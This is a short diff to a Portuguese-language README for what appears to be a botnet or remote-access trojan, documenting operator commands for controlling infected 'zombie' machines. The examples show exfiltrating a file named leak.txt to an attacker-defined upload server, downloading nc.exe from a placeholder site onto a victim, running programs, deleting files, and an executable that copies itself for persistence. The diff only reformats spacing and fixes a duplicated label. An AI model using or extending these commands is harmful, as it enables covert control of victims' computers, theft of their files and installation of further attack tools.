@@ -73,28 +73,34 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		
 
 - [dir] para vizualizar o diretorio atual do zumbi <br>
+		
 		$ USAGE: ls <nickdobot> <br>
 		$ Ex: ls DESKTOP-PC-3456
 
 - [ls] para listar o conteudo da pasta atual <br>
+		
 		$ USAGE: ls <nickdobot> <br>
 		$ Ex: ls DESKTOP-PC-3456
 
 - [ip] para mostrar os ips do bot
+		
 		$ USAGE: ls <nickdobot> 
 		$ Ex: ip DESKTOP-PC-3456
 	
 - [upload] para fazer upload de arquivos do bot
   Será feito o upload para o servidor web definido na variável urlUpload 
+		
 		$ USAGE: $ USAGE: upload <Arquivo> <nickdobot>
 		$ Ex: upload leak.txt DESKTOP-PC-3456
 
 - [download] para baixar arquivos da web para o zumbi
+		
 		$ USAGE: $ USAGE: download <link> <nickdobot>
 		$ Ex: download http://seusite.com/nc.exe DESKTOP-PC-3456
 
 - [run] para executar um programa ou arquivo.
-		$ USAGE: $ USAGE: run <programa> <nickdobot>
+
+		$ USAGE:  run <programa> <nickdobot>
 		$ Ex: run calc.exe DESKTOP-PC-3456
 
 - [delete]        para excluir arquivos
